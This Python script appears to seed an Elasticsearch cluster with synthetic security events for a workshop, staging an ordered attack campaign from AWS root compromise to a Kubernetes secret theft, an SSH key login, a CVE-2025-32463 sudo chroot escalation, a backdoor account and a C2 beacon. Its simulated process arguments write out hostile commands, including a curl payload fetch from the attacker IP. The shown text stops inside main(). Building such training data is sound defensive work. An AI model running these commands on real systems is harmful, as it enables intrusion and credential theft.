#!/usr/bin/env python3
"""ElastiCon workshop — the crown-jewel campaign, seeded in the order an analyst can follow.

Replaces `democtl prep grid` for the workshop. VGI's grid_runner writes the hero-host events
out of order (backdoor account created *before* the brute force, www-data logging in first),
which left the labs with no story to follow. This seeder reuses VGI's emitters for the cloud,
Kubernetes, WAF and firewall stages, and writes its own hero-host stage so every lab answers
the question the previous one raised:

    WAF recon → AWS root compromise → CloudTrail + GuardDuty killed
      → kubectl exec into the GridVault pod → **reads the `gridvault-deploy-ssh` secret**
      → SSH password spray on the crown jewel FAILS (25×) → **public-key login succeeds**
         with the stolen deploy key
      → `sudo --version` (1.9.16p2, vulnerable) → nsswitch.conf planted → `sudo -R woot woot`
         = **CVE-2025-32463** → root → `useradd whte_rbt` + sudo group + authorized_keys
      → C2 beacon to 203.0.113.66:443 (Palo Alto threat)

Everything is written relative to *now* — the SSH brute-force rule (8cb84371) has no
timestamp override, so the campaign must land inside its 9-minute look-back. Run it the
morning of the workshop; the guides say "Last 24 hours".

    source <scratchpad>/env.sh
    python3 crownjewel_seed.py --reset      # delete the old Sep-18 campaign + prior runs, then seed
    python3 crownjewel_seed.py              # seed only (deletes prior runs of *this* seeder)
    python3 crownjewel_seed.py --status     # which expected alerts have fired
"""
from __future__ import annotations

import argparse
import json
import os
import random
import sys
import time
import urllib.error
import urllib.request
import uuid
from datetime import datetime, timedelta, timezone

def _generator_path():
    """The vgi_sim generator package: $VGI_GENERATOR, else seed-kit/generator next to this script."""
    here = os.path.dirname(os.path.abspath(__file__))
    for p in (os.environ.get("VGI_GENERATOR", ""), os.path.join(here, "..", "generator")):
        if p and os.path.isdir(os.path.join(p, "vgi_sim")):
            return os.path.abspath(p)
    sys.exit("vgi_sim not found: run from seed-kit/ or set VGI_GENERATOR")


sys.path.insert(0, _generator_path())
from vgi_sim.clock import Timeline, iso_ms, now_utc                       # noqa: E402
from vgi_sim.emitters import cloudtrail as ct, waf, panw                  # noqa: E402
from vgi_sim.emitters import kubernetes_audit as k8s, container_logs      # noqa: E402
from vgi_sim.emitters import system_auth as auth                          # noqa: E402
from vgi_sim.entities import ATTACKER, SCANNER, PRIMARY_DB, NS_PROD_USWEST  # noqa: E402

ES = os.environ.get("ELASTICSEARCH_URL", "").rstrip("/")
KB = os.environ.get("KIBANA_URL", "").rstrip("/")
KEY = os.environ.get("ELASTICSEARCH_API_KEY", "")
KB_KEY = os.environ.get("KIBANA_API_KEY", "") or KEY
SPACE = os.environ.get("KIBANA_SPACE", "default")      # KIBANA_URL must carry /s/<space> too (deploy.py adds it)
ALERTS = f".alerts-security.alerts-{SPACE}"
ENTITIES = f".entities.v2.latest.security_{SPACE}*"

TAG = "vgi-crownjewel"
NS = NS_PROD_USWEST
HERO = PRIMARY_DB                        # gridvault-usw2-01 / 10.32.14.21
USER = "svc-conan-deploy"
BACKDOOR = "whte_rbt"
DEPLOY_SECRET = "gridvault-deploy-ssh"
KEY_FP = "ED25519 SHA256:JudgmentDay1997Aug29q3Vx8pK2mN7dRf4LwT9hZc1"   # the stolen deploy key (T2: 29 Aug 1997)
SUDO_VER = "1.9.15p5"                    # matches the Wiz finding; CVE-2025-32463 fixed in 1.9.17p1
WORKDIR = "/tmp/.woot"
# Easter eggs, all in the data (see CLAUDE.md for the list)
C2_PATH = "/wopr/shall-we-play-a-game"                       # WarGames
C2_THREAT = "Cyberdyne T-800 C2 — Spyware Command and Control Traffic"
SCANNER_UA = "WOPR/1.0 (Global Thermonuclear War)"
MAGIC_WORD = "ah ah ah, you didn't say the magic word"         # Nedry's backdoor, Jurassic Park
LEET_ADMIN = "j.slater"                                         # logs in at 13:37:00 two days before
ENDPOINT_AGENT = "5f1c0a8e-2b7d-4c39-9e61-7d2a4b8c3f10"   # Defend agent on the hero host

# Rules this campaign is expected to fire (rule_id prefix → name). --status checks them.
EXPECTED = [
    ("4d50a94f", "AWS Management Console Brute Force of Root User Identity"),
    ("e2a67480", "AWS Management Console Root Login"),
    ("696015ef", "AWS IAM User Created Access Keys For Another User"),
    ("d8fc1cca", "AWS IAM Deactivation of MFA Device"),
    ("1aa8fa52", "AWS CloudTrail Log Suspended"),
    ("523116c0", "AWS GuardDuty Detector Deletion"),
    ("14de811c", "Kubernetes User Exec into Pod"),
    ("c7908cac", "Kubernetes Privileged Pod Created"),
    ("a2951930", "Kubernetes Cluster-Admin Role Binding Created"),
    ("63c057cc", "Kubernetes Anonymous Request Authorized by Unusual User Agent"),
    ("8cb84371", "Potential Successful SSH Brute Force Attack"),
    ("5c495612", "Successful SSH Authentication from Unusual IP Address"),
    ("163a8f2f", "Potential CVE-2025-32463 Nsswitch File Creation"),
    ("1d485649", "Potential CVE-2025-32463 Sudo Chroot Execution Attempt"),
    ("edfd5ca9", "Linux User Account Creation"),
    ("283683eb", "Newly Observed Palo Alto Network Alert"),
]


# ---------------------------------------------------------------- http
def _req(base, key, method, path, body=None, ndjson=False, timeout=120):
    data = None
    if body is not None:
        data = body.encode() if ndjson else json.dumps(body).encode()
    r = urllib.request.Request(f"{base}{path}", method=method, data=data, headers={
        "Authorization": f"ApiKey {key}",
        "Content-Type": "application/x-ndjson" if ndjson else "application/json",
        "kbn-xsrf": "true", "x-elastic-internal-origin": "Kibana",
        "elastic-api-version": "2023-10-31"})
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            raw = resp.read()
            return json.loads(raw) if raw else {}
    except urllib.error.HTTPError as e:
        return {"__error": e.code, "body": e.read().decode()[:500]}
    except TimeoutError as e:                           # ML open/reset can outlast a busy cluster's 120 s
        return {"__error": "timeout", "body": str(e)}


def es(method, path, body=None, **kw):
    return _req(ES, KEY, method, path, body, **kw)


def kb(method, path, body=None, **kw):
    return _req(KB, KB_KEY, method, path, body, **kw)


def bulk(events):
    by_ds = {}
    for ds, doc in events:
        doc.setdefault("tags", [])
        if TAG not in doc["tags"]:
            doc["tags"].append(TAG)
        by_ds.setdefault(ds, []).append(doc)
    for ds, docs in by_ds.items():
        lines = "".join(json.dumps({"create": {}}) + "\n" + json.dumps(d) + "\n" for d in docs)
        r = es("POST", f"/{ds}/_bulk?refresh=wait_for", lines, ndjson=True)
        errs = [i["create"].get("error") for i in r.get("items", []) if i["create"].get("error")]
        print(f"  indexed {len(docs) - len(errs):3d} -> {ds}" + (f"   ⚠ {len(errs)} errors: {errs[0]}" if errs else ""))
        if "__error" in r:
            print("  ⚠", r)


# ---------------------------------------------------------------- hero-host endpoint (Defend-shaped)
def _eid():
    return uuid.uuid4().hex[:22]


class Proc:
    """A process in the hero host's tree, enough for Analyzer + Session View."""

    def __init__(self, name, exe, args, user, pid, start, parent=None, entry=None, cwd="/",
                 interactive=True):
        self.name, self.exe, self.args, self.user, self.pid = name, exe, args, user, pid
        self.start, self.parent, self.cwd, self.interactive = start, parent, cwd, interactive
        self.entity_id = _eid()
        self.entry = entry or self
        self.ancestry = ([parent.entity_id] + parent.ancestry)[:5] if parent else []

    def brief(self):
        uid = "0" if self.user == "root" else "1002"
        return {"entity_id": self.entity_id, "pid": self.pid, "name": self.name,
                "executable": self.exe, "args": self.args, "args_count": len(self.args),
                "command_line": " ".join(self.args), "start": iso_ms(self.start),
                "working_directory": self.cwd, "interactive": self.interactive,
                "user": {"id": uid, "name": self.user}, "real_user": {"id": uid, "name": self.user},
                "group": {"id": uid, "name": self.user}}

    def fields(self):
        p = self.brief()
        p["Ext"] = {"ancestry": self.ancestry}
        if self.parent:
            p["parent"] = self.parent.brief()
        e = self.entry.brief()
        e["entry_meta"] = {"type": "sshd", "source": {"ip": ATTACKER.ip}}
        p["entry_leader"] = e
        p["session_leader"] = self.entry.brief()
        p["group_leader"] = self.entry.brief()
        p["tty"] = {"char_device": {"major": 136, "minor": 0}}
        return p


def _endpoint_env(ts, dataset, host=HERO):
    uid_user = None
    return {
        "@timestamp": iso_ms(ts),
        "agent": {"id": ENDPOINT_AGENT, "type": "endpoint", "version": "9.5.4"},
        "elastic": {"agent": {"id": ENDPOINT_AGENT}},
        "data_stream": {"type": "logs", "dataset": dataset, "namespace": "default"},
        "ecs": {"version": "8.10.0"},
        "host": {**host.fields()["host"]},
        "message": "Endpoint process event" if dataset.endswith("process") else
                   ("Endpoint file event" if dataset.endswith("file") else "Endpoint network event"),
        "tags": [TAG],
    }


def proc_exec(ts, p: Proc):
    d = _endpoint_env(ts, "endpoint.events.process")
    d["event"] = {"kind": "event", "category": ["process"], "type": ["start"], "action": "exec",
                  "dataset": "endpoint.events.process", "module": "endpoint", "outcome": "unknown",
                  "id": uuid.uuid4().hex[:24], "created": iso_ms(ts)}
    d["process"] = p.fields()
    d["user"] = {"id": d["process"]["user"]["id"], "name": p.user}
    return ("logs-endpoint.events.process-default", d)


def file_create(ts, p: Proc, path):
    d = _endpoint_env(ts, "endpoint.events.file")
    d["event"] = {"kind": "event", "category": ["file"], "type": ["creation"], "action": "creation",
                  "dataset": "endpoint.events.file", "module": "endpoint", "outcome": "unknown",
                  "id": uuid.uuid4().hex[:24], "created": iso_ms(ts)}
    d["file"] = {"path": path, "name": path.rsplit("/", 1)[-1], "directory": path.rsplit("/", 1)[0]}
    d["process"] = p.fields()
    d["user"] = {"name": p.user}
    return ("logs-endpoint.events.file-default", d)


def net_connect(ts, p: Proc, dst_ip, dport):
    d = _endpoint_env(ts, "endpoint.events.network")
    sport = random.randint(40000, 60000)
    d["event"] = {"kind": "event", "category": ["network"], "type": ["start"],
                  "action": "connection_attempted", "dataset": "endpoint.events.network",
                  "module": "endpoint", "outcome": "unknown", "id": uuid.uuid4().hex[:24]}
    d["source"] = {"ip": HERO.ip, "port": sport}
    d["destination"] = {"ip": dst_ip, "port": dport}
    d["network"] = {"direction": "egress", "transport": "tcp", "type": "ipv4"}
    d["process"] = p.fields()
    d["user"] = {"name": p.user}
    return ("logs-endpoint.events.network-default", d)


def sudo_log(ts, cmd, pwd, chroot=None):
    """sudo's own auth.log line, as the System integration parses it."""
    extra = f" ; CHROOT={chroot}" if chroot else ""
    msg = f"{USER} : TTY=pts/0 ; PWD={pwd} ; USER=root{extra} ; COMMAND={cmd}"
    body = {
        "@timestamp": iso_ms(ts), "message": msg,
        "event": {"kind": "event", "id": str(uuid.uuid4()), "category": ["process"],
                  "type": ["start"], "outcome": "success", "timezone": "+00:00",
                  "original": f"{ts.strftime('%b %e %H:%M:%S')} {HERO.name} sudo: {msg}"},
        "process": {"name": "sudo"},
        "user": {"name": USER, "effective": {"name": "root"}},
        "system": {"auth": {"sudo": {"tty": "pts/0", "pwd": pwd, "user": "root", "command": cmd}}},
        "input": {"type": "log"}, "log": {"file": {"path": "/var/log/auth.log"}},
        "related": {"hosts": [HERO.name], "user": [USER, "root"]},
    }
    return (f"logs-system.auth-{NS}",
            auth.wrap(body, dataset="system.auth", namespace=NS, agent=HERO.agent, host=HERO,
                      tags=["preserve_original_event", "system-auth"]))


def _hires_syslog(ev):
    """Give system.auth lines an rsyslog high-precision (ISO) timestamp.

    The System integration rebuilds @timestamp from the syslog prefix. Classic BSD syslog has
    whole seconds only, so 25 failures half a second apart collapse onto ~13 tied timestamps
    and the brute-force rule's `runs=25` sequence stops matching reliably. ISO keeps the ms.
    """
    import re
    for ds, d in ev:
        if ds.startswith("logs-system.auth-") and d.get("event", {}).get("original"):
            ts = d["@timestamp"].replace("Z", "000+00:00")
            d["event"]["original"] = re.sub(r"^[A-Z][a-z]{2} [ \d]\d \d\d:\d\d:\d\d", ts, d["event"]["original"])
    return ev


# ---------------------------------------------------------------- competing lead (Lab 4)
LEAD_HOST = {"name": "elasticon", "hostname": "elasticon", "id": "8c1d3e5f7a9b4c2d8e6f0a1b3c5d7e9f",
             "os": {"type": "linux", "family": "ubuntu", "name": "Ubuntu", "version": "24.04",
                    "platform": "ubuntu", "kernel": "6.8.0-45-generic"},
             "architecture": "x86_64", "ip": ["10.32.50.40"]}
LEAD_AGENT = "e068073e-334f-471b-90c5-9ecc5553bf82"


def lead_fixture(ts):
    """apt-get -qq -y update → dash → update-notifier hook, as Elastic Defend records it."""
    def doc(t, p, parent):
        eid = _eid()
        return ("logs-endpoint.events.process-default", {
            "@timestamp": iso_ms(t),
            "agent": {"id": LEAD_AGENT, "type": "endpoint", "version": "9.5.4"},
            "elastic": {"agent": {"id": LEAD_AGENT}},
            "data_stream": {"type": "logs", "dataset": "endpoint.events.process", "namespace": "default"},
            "ecs": {"version": "8.10.0"}, "host": LEAD_HOST, "message": "Endpoint process event",
            "event": {"kind": "event", "category": ["process"], "type": ["start"], "action": "exec",
                      "dataset": "endpoint.events.process", "module": "endpoint", "outcome": "unknown",
                      "id": uuid.uuid4().hex[:24], "created": iso_ms(t)},
            "process": {**p, "entity_id": eid, "start": iso_ms(t), "parent": parent,
                        "user": {"id": "0", "name": "root"}, "working_directory": "/tmp"},
            "user": {"id": "0", "name": "root"}, "tags": [TAG]})
    apt = {"entity_id": _eid(), "pid": 153640, "name": "apt-get", "executable": "/usr/bin/apt-get",
           "args": ["apt-get", "-qq", "-y", "update"], "command_line": "apt-get -qq -y update"}
    sh = {"pid": 153659, "name": "dash", "executable": "/usr/bin/dash",
          "args": ["sh", "-c", "/usr/lib/update-notifier/update-motd-updates-available 2>/dev/null || true"],
          "command_line": "sh -c /usr/lib/update-notifier/update-motd-updates-available 2>/dev/null || true",
          "hash": {"sha256": "2f86ee371c7250d927f3e32ccb449986ee9e7c4d5b5c96d4e619d6c6f29ef92e"}}
    return [doc(ts, sh, apt)]


# ---------------------------------------------------------------- the campaign
def build():
    ev = []
    now = now_utc()
    tl = Timeline(base=now, start_offset_s=-1560)            # campaign opens ~26 min ago

    # 1 · Edge recon (context — no rule reads WAF)
    for i in range(8):
        ev.append((f"logs-aws.waf-{NS}", waf.probe(tl.at(i * 5), namespace=NS,
                                                   src=ATTACKER if i % 2 else SCANNER)))
    ev.append((f"logs-aws.waf-{NS}", waf.probe(tl.at(45), namespace=NS, src=ATTACKER, allowed=True)))
    ev.append((f"logs-aws.waf-{NS}", waf.waf_event(tl.at(47), namespace=NS, src=SCANNER, action="BLOCK",
                                                   uri="/api/v1/games", user_agent=SCANNER_UA)))
    tl.advance(60)

    # 2 · AWS: root console brute force → root login → persistence → blind the sensors
    for _ in range(12):
        ev.append((f"logs-aws.cloudtrail-{NS}", ct.console_login(tl.advance(6), outcome="failure", namespace=NS)))
    ev.append((f"logs-aws.cloudtrail-{NS}", ct.console_login(tl.advance(20), outcome="success", namespace=NS, mfa_used=False)))
    ev.append((f"logs-aws.cloudtrail-{NS}", ct.create_access_key(tl.advance(45), namespace=NS)))
    ev.append((f"logs-aws.cloudtrail-{NS}", ct.deactivate_mfa(tl.advance(30), namespace=NS, target="h.langston")))
    ev.append((f"logs-aws.cloudtrail-{NS}", ct.stop_logging(tl.advance(25), namespace=NS)))
    ev.append((f"logs-aws.cloudtrail-{NS}", ct.delete_detector(tl.advance(15), namespace=NS)))

    # 3 · Kubernetes: into the GridVault pod, escalate, and take the deploy key
    kds = f"logs-kubernetes.audit_logs-{NS}"
    ev.append((kds, k8s.exec_into_pod(tl.advance(60), namespace=NS)))
    ev.append((kds, k8s.privileged_pod(tl.advance(15), namespace=NS)))
    ev.append((kds, k8s.hostnetwork_pod(tl.advance(10), namespace=NS)))
    ev.append((kds, k8s.cluster_admin_binding(tl.advance(12), namespace=NS,
                                              name="cluster-admin-for-the-greater-good")))
    ev.append((kds, k8s.anonymous_secrets(tl.advance(8), namespace=NS)))
    t_secret = tl.advance(20)
    ev.append((kds, k8s._audit(
        t_secret, namespace=NS, verb="get", resource="secrets", level="Metadata",
        stage="ResponseComplete",
        request_uri=f"/api/v1/namespaces/{k8s.K8S_NAMESPACE}/secrets/{DEPLOY_SECRET}",
        object_name=DEPLOY_SECRET, event_category=["iam"], event_type=["access"], response_code=200)))
    ev.append((f"logs-kubernetes.container_logs-{NS}", container_logs.container_log(
        tl.advance(6), namespace=NS, service="flux-capacitor-svc", level="ERROR", stream="stderr",
        message=f"kubectl get secret {DEPLOY_SECRET} -o jsonpath='{{.data.id_ed25519}}' | base64 -d > /tmp/k  # spawned via kubectl exec")))

    # 4 · The crown jewel. Everything from here is anchored close to now: rule 8cb84371
    #     keys on @timestamp with a 9-minute look-back.
    # 150 s before seeding: the 9-min look-back on a 5-min schedule then always covers it,
    # whatever the phase of the rule's schedule when the seed lands.
    t = now - timedelta(seconds=150)
    ads = f"logs-system.auth-{NS}"
    for i in range(25):                                        # password spray — every one fails
        ev.append((ads, auth.ssh_login(t + timedelta(seconds=i * 0.5), host=HERO, user=USER,
                                       src=ATTACKER, outcome="failure", namespace=NS)))
    t_ok = t + timedelta(seconds=13)
    ok = auth.ssh_login(t_ok, host=HERO, user=USER, src=ATTACKER, outcome="success",
                        namespace=NS, method="publickey")
    port = ok["source"]["port"]
    ok["message"] = f"Accepted publickey for {USER} from {ATTACKER.ip} port {port} ssh2: {KEY_FP}"
    ok["event"]["original"] = auth._syslog_line(t_ok, HERO.name, "sshd", ok["process"]["pid"], ok["message"])
    ok["system"]["auth"]["ssh"]["signature"] = KEY_FP
    ev.append((ads, ok))

    # Endpoint: the interactive session the key opened
    sshd = Proc("sshd", "/usr/sbin/sshd", ["/usr/sbin/sshd", "-D"], "root", 812,
                now - timedelta(days=9), interactive=False)
    sess = Proc("sshd", "/usr/sbin/sshd", ["sshd:", f"{USER}", "[priv]"], "root",
                random.randint(20000, 30000), t_ok, parent=sshd, interactive=False)
    bash = Proc("bash", "/usr/bin/bash", ["-bash"], USER, sess.pid + 3,
                t_ok + timedelta(seconds=1), parent=sess, cwd=f"/home/{USER}")
    bash.entry = bash
    sess.entry = bash
    ev.append(proc_exec(sess.start, sess))
    ev.append(proc_exec(bash.start, bash))

    s = t_ok + timedelta(seconds=4)
    def child(name, exe, args, offset, user=USER, parent=None, cwd=None):
        par = parent or bash
        p = Proc(name, exe, args, user, random.randint(30000, 60000), s + timedelta(seconds=offset),
                 parent=par, entry=bash, cwd=cwd or par.cwd)
        ev.append(proc_exec(p.start, p))
        return p

    child("id", "/usr/bin/id", ["id"], 0)
    child("uname", "/usr/bin/uname", ["uname", "-a"], 3)
    child("sudo", "/usr/bin/sudo", ["sudo", "--version"], 8)            # recon: reports SUDO_VER (vulnerable)
    ev.append(sudo_log(s + timedelta(seconds=13), "list", f"/home/{USER}"))
    child("sudo", "/usr/bin/sudo", ["sudo", "-l"], 13)
    child("mkdir", "/usr/bin/mkdir", ["mkdir", "-p", f"{WORKDIR}/woot/etc", f"{WORKDIR}/libnss_"], 22)
    bash.cwd = WORKDIR
    ev.append(file_create(s + timedelta(seconds=27), bash, f"{WORKDIR}/woot/etc/nsswitch.conf"))
    ev.append(file_create(s + timedelta(seconds=29), bash, f"{WORKDIR}/woot/etc/group"))
    child("gcc", "/usr/bin/gcc", ["gcc", "-shared", "-fPIC", "-Wl,-init,woot", "-o",
                                  "libnss_/woot1337.so.2", "woot1337.c"], 34)
    t_x = s + timedelta(seconds=45)
    ev.append(sudo_log(t_x, "woot", WORKDIR, chroot="woot"))
    sudo_x = child("sudo", "/usr/bin/sudo", ["sudo", "-R", "woot", "woot"], 45)
    root = Proc("bash", "/usr/bin/bash", ["/bin/bash"], "root", sudo_x.pid + 1,
                t_x + timedelta(seconds=1), parent=sudo_x, entry=bash, cwd=WORKDIR)
    ev.append(proc_exec(root.start, root))
    t_ua = t_x + timedelta(seconds=14)
    child("useradd", "/usr/sbin/useradd", ["useradd", "-m", "-s", "/bin/bash", BACKDOOR], 59,
          user="root", parent=root)
    ev.append((ads, auth.useradd(t_ua, host=HERO, new_user=BACKDOOR, uid=1500, namespace=NS)))
    child("usermod", "/usr/sbin/usermod", ["usermod", "-aG", "sudo", BACKDOOR], 64, user="root", parent=root)
    ev.append(file_create(s + timedelta(seconds=70), root, f"/home/{BACKDOOR}/.ssh/authorized_keys"))
    plan = child("sh", "/usr/bin/sh", ["sh", "-c", f"echo \"{MAGIC_WORD}\" > /home/{BACKDOOR}/.plan"], 73,
                 user="root", parent=root)
    ev.append(file_create(s + timedelta(seconds=73.1), plan, f"/home/{BACKDOOR}/.plan"))
    curl = child("curl", "/usr/bin/curl", ["curl", "-sk", f"https://{ATTACKER.ip}{C2_PATH}", "-o",
                                           "/dev/shm/.gw"], 80, user="root", parent=root)
    ev.append(net_connect(s + timedelta(seconds=80.2), curl, ATTACKER.ip, 443))
    child("rm", "/usr/bin/rm", ["rm", "-rf", WORKDIR], 95, user="root", parent=root, cwd="/")

    # 5 · Perimeter: the firewall sees the crown jewel beacon out
    pds = f"logs-panw.panos-{NS}"
    tp = s + timedelta(seconds=82)
    for i in range(2):
        ev.append((pds, panw.traffic(tp + timedelta(seconds=i * 12), src_ip=HERO.ip, dst=ATTACKER,
                                     dst_port=443, app="ssl", sub_type="end", duration_s=9,
                                     bytes_out=1360, bytes_in=580, rule_name="allow-outbound-web",
                                     namespace=NS)))
    for i in range(3):
        ev.append((pds, panw.threat(tp + timedelta(seconds=30 + i * 15), src_ip=HERO.ip, dst=ATTACKER,
                                    dst_port=443, sub_type="spyware", severity="medium", action="alert",
                                    threat_id="86672",
                                    threat_name=C2_THREAT,
                                    threat_category="spyware", app="ssl", url_path=C2_PATH,
                                    rule_name="gridvault-perimeter-egress-block", namespace=NS)))
    # 5b · An administrator who logs in at exactly 13:37:00 (two days ago, a normal key login)
    leet = (now - timedelta(days=2)).replace(hour=13, minute=37, second=0, microsecond=0)
    ev.append((ads, auth.ssh_login(leet, host=HERO, user=LEET_ADMIN, src="10.32.2.16", outcome="success",
                                   namespace=NS, method="publickey")))

    # 6 · Competing lead 1 (Lab 4): a benign apt hook on another Linux box. Custom rule
    #     vgi-lab3-shell-from-package-manager fires on it. Seeded so the lead exists on any cluster,
    #     with or without a real Defend host called "elasticon".
    ev.extend(lead_fixture(now - timedelta(hours=3)))
    _hires_syslog(ev)
    return ev, {"campaign_start": tl.base, "secret_read": t_secret, "spray_start": t,
                "key_login": t_ok, "exploit": t_x, "backdoor": t_ua, "beacon": s + timedelta(seconds=80)}


# ---------------------------------------------------------------- cleanup
OLD_CAMPAIGN_RULES = [
    "AWS IAM User Console Login Without MFA", "AWS IAM Long-Term Access Key First Seen from Source IP",
    "AWS Sensitive IAM Operations Performed via CloudShell", "AWS IAM User Created Access Keys For Another User",
    "AWS Management Console Root Login", "AWS IAM Deactivation of MFA Device", "AWS CloudTrail Log Suspended",
    "AWS GuardDuty Detector Deletion", "Kubernetes User Exec into Pod", "Kubernetes Privileged Pod Created",
    "Kubernetes Pod Created With HostNetwork", "Kubernetes Cluster-Admin Role Binding Created",
    "Kubernetes Anonymous Request Authorized by Unusual User Agent",
    "Volume Shadow Copy Deleted or Resized via VssAdmin", "Clearing Windows Event Logs",
    "Credential Theft via LSASS Memory Access", "Unusual Login via System User", "Linux User Account Creation",
    "Potential Successful SSH Brute Force Attack", "Successful SSH Authentication from Unusual IP Address",
    "AWS Management Console Brute Force of Root User Identity",
    "AWS IAM Long-Term Access Key Correlated with Elevated Detection Alerts",
    "Newly Observed Palo Alto Network Alert",
]


def dbq(index, query, label):
    r = es("POST", f"/{index}/_delete_by_query?conflicts=proceed&refresh=true", {"query": query})
    if "__error" in r:
        print(f"  ⚠ {label}: {r}")
    else:
        print(f"  deleted {r.get('deleted', 0):4d}  {label}")


def reset(old=True):
    print("Cleanup")
    dbq("logs-*", {"term": {"tags": TAG}}, "source events from earlier runs of this seeder")
    dbq(ALERTS, {"term": {"tags": TAG}}, "alerts from earlier runs")
    if not old:
        return
    # The original out-of-order hero-host attack (Sep 18). Keeps the 30-day admin baseline.
    dbq("logs-system.auth-*", {"bool": {"filter": [{"term": {"host.name": HERO.name}}], "should": [
        {"term": {"source.ip": ATTACKER.ip}}, {"term": {"user.name": "www-data"}},
        {"term": {"event.action": "user_add"}}], "minimum_should_match": 1}},
        "old hero-host attack events (spray, www-data, useradd)")
    # The old campaign's alerts. ML alerts are kept — historical anomalies on the host are fine.
    dbq(ALERTS, {"bool": {"filter": [
        {"terms": {"kibana.alert.rule.name": OLD_CAMPAIGN_RULES}},
        {"range": {"kibana.alert.original_time": {"gte": "2026-09-18T12:00:00Z", "lte": "2026-09-18T15:00:00Z"}}}],
        "must_not": [{"term": {"kibana.alert.rule.type": "machine_learning"}}]}},
        "old Sep-18 campaign alerts (ML alerts kept)")


# ---------------------------------------------------------------- ML: forget previous rehearsals
ML_JOBS = ["suspicious_login_activity_ea", "auth_high_count_logon_fails_ea",
           "auth_rare_source_ip_for_a_user_ea"]


def ml_reset(days=35):
    """Reset the auth ML jobs and relearn the baseline, so the seeded attack is new to them.

    Every rehearsal teaches the models the campaign; without this, the workshop-day run no
    longer looks anomalous and no ML alert fires. Run it AFTER cleanup and BEFORE seeding.
    """
    print("ML reset")
    start = iso_ms(now_utc() - timedelta(days=days))
    for j in ML_JOBS:
        es("POST", f"/_ml/datafeeds/datafeed-{j}/_stop?force=true")
        es("POST", f"/_ml/anomaly_detectors/{j}/_close?force=true", timeout=600)
        r = es("POST", f"/_ml/anomaly_detectors/{j}/_reset?wait_for_completion=true", timeout=600)
        es("POST", f"/_ml/anomaly_detectors/{j}/_open", timeout=600)
        s = es("POST", f"/_ml/datafeeds/datafeed-{j}/_start", {"start": start}, timeout=600)
        print(f"  {j}: reset {'ok' if '__error' not in r else r}, datafeed {'started' if s.get('started') else s}")
    # Wait until every datafeed has finished its look-back and switched to real time.
    for _ in range(90):
        st = es("GET", f"/_ml/datafeeds/{','.join('datafeed-' + j for j in ML_JOBS)}/_stats")
        rt = [d for d in st.get("datafeeds", []) if (d.get("running_state") or {}).get("real_time_running")]
        if len(rt) == len(ML_JOBS):
            break
        time.sleep(10)
    for j in es("GET", f"/_ml/anomaly_detectors/{','.join(ML_JOBS)}/_stats").get("jobs", []):
        print(f"  {j['job_id']}: {j['state']}, {j['data_counts']['processed_record_count']} records relearned")


CRITICALITY = {HERO.name: "extreme_impact", "VGI-LT-4471": "high_impact",
               "gridvault-bastion-usw2-01": "high_impact"}


def ensure_crown_jewel(wait=True):
    """Pin asset criticality in BOTH places it lives, and wait until the entity store agrees.

    Entity Store v2 keeps its own copy on the entity document (the host flyout renders it, and
    alert enrichment copies it into host.asset.criticality at alert time). It can lag or drift
    from the asset-criticality API — a 2026-09-27 seed stamped 34 alerts `high_impact` while
    the API said extreme. So: set both, then wait for the entity doc before seeding a single event.
    """
    for host, level in CRITICALITY.items():
        kb("POST", "/api/asset_criticality", {"id_field": "host.name", "id_value": host,
                                               "criticality_level": level})
    # The store's entity id is not always host:<host.id> (9.5 derives its own), so look it up by name.
    found = es("POST", f"/{ENTITIES}/_search", {"size": 20, "_source": ["entity.id", "entity.name"], "query": {
        "bool": {"filter": [{"term": {"entity.EngineMetadata.Type": "host"}},
                            {"terms": {"entity.name": list(CRITICALITY)}}]}}})
    ids = {h["_source"]["entity"]["id"]: h["_source"]["entity"]["name"] for h in found.get("hits", {}).get("hits", [])}
    ids = ids or {f"host:{HERO.id}": HERO.name}
    for eid, name in ids.items():
        r = kb("PUT", "/api/security/entity_store/entities/host?force=true",
               {"entity": {"id": eid}, "asset": {"criticality": CRITICALITY[name]}})
        print(f"  entity {name} ({eid}): {CRITICALITY[name]} ({'ok' if r.get('ok') else r})")
    if not wait:
        return True
    for _ in range(18):
        e = es("POST", f"/{ENTITIES}/_search", {"size": 5, "query": {"bool": {
            "filter": [{"term": {"entity.EngineMetadata.Type": "host"}}],
            "should": [{"term": {"entity.name": HERO.name}}, {"term": {"host.name": HERO.name}}],
            "minimum_should_match": 1}}, "_source": ["asset.criticality", "entity.id"]})
        levels = [(h["_source"].get("asset") or {}).get("criticality")
                  for h in e.get("hits", {}).get("hits", [])]
        if "extreme_impact" in levels and "high_impact" not in levels:
            print("  entity store agrees: extreme_impact")
            return True
        if "__error" in e or not levels:
            print("  entity store has no host doc yet (fresh cluster) — alerts will enrich from the API value")
            return True
        time.sleep(10)
    print(f"  ⚠ entity store still reads {levels} — alerts may be stamped with the wrong criticality")
    return False


# ---------------------------------------------------------------- status
def status(since=None):
    since = since or (now_utc() - timedelta(hours=24))
    # Match on rule id, not tags: threshold-rule alerts do not copy the source event's tags.
    q = {"size": 0, "query": {"bool": {"filter": [{"range": {"@timestamp": {"gte": iso_ms(since)}}}]}},
         "aggs": {"r": {"terms": {"field": "kibana.alert.rule.rule_id", "size": 50},
                        "aggs": {"n": {"terms": {"field": "kibana.alert.rule.name", "size": 1}}}}}}
    r = es("POST", f"/{ALERTS}/_search", q)
    got = {b["key"][:8]: b["doc_count"] for b in r.get("aggregations", {}).get("r", {}).get("buckets", [])}
    fired = 0
    for rid, name in EXPECTED:
        n = got.get(rid, 0)
        fired += bool(n)
        print(f"  {'✅' if n else '⏳'} {n:3d}  {name}")
    extra = {k: v for k, v in got.items() if k not in {e[0] for e in EXPECTED}}
    for k, v in extra.items():
        print(f"  ➕ {v:3d}  (other rule {k})")
    ml = es("POST", f"/{ALERTS}/_search", {"size": 5, "query": {"bool": {"filter": [
        {"term": {"kibana.alert.rule.type": "machine_learning"}}, {"term": {"host.name": HERO.name}},
        {"range": {"kibana.alert.original_time": {"gte": iso_ms(since)}}}]}}, "_source": ["kibana.alert.rule.name", "kibana.alert.original_time"]})
    for h in ml.get("hits", {}).get("hits", []):
        print(f"  🧠 ML  {h['_source']['kibana.alert.rule.name']} @ {h['_source']['kibana.alert.original_time']}")
    print(f"  {fired}/{len(EXPECTED)} expected rules fired")
    return fired


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--reset", action="store_true", help="also delete the old Sep-18 campaign")
    ap.add_argument("--status", action="store_true")
    ap.add_argument("--ml-reset", action="store_true",
                    help="reset + relearn the auth ML jobs before seeding (pre-flight)")
